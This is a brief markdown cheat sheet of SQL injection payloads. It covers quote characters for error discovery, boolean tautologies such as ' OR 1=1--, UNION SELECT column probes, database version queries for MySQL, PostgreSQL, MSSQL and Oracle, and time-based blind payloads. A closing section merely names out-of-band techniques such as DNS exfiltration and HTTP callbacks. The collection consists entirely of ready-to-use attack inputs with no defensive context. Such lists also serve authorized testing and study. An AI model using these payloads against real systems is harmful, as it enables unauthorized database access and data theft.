# Payload Collection

## Error Discovery

'
''
"
`

---

## Boolean

' OR 1=1--

' OR 1=2--

---

## UNION

' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--

---

## Version Discovery

MySQL:
UNION SELECT @@version

PostgreSQL:
UNION SELECT version()

MSSQL:
UNION SELECT @@version

Oracle:
UNION SELECT banner FROM v$version

---

## Time-Based

MySQL:
SLEEP(5)

PostgreSQL:
pg_sleep(5)

MSSQL:
WAITFOR DELAY '0:0:5'

---

## OAST

Collaborator payloads

DNS exfiltration payloads

HTTP callbacks
